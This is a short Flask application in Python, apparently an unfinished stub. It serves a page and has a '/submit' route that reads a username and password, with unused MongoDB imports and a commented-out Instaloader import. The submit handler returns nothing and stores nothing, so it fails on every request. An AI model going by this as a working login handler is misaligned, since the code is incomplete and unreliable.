from flask import Flask, request, render_template, jsonify
#import instaloader
import pymongo
from pymongo import MongoClient

app = Flask(__name__)

# Ruta para la página principal
@app.route('/')
def index():
    return render_template('index.html')

# Ruta para el procesamiento del formulario
@app.route('/submit', methods=['POST'])
def submit():
    username = request.form['username']
    password = request.form['password']

if __name__ == '__main__':
    app.run(port=5001)
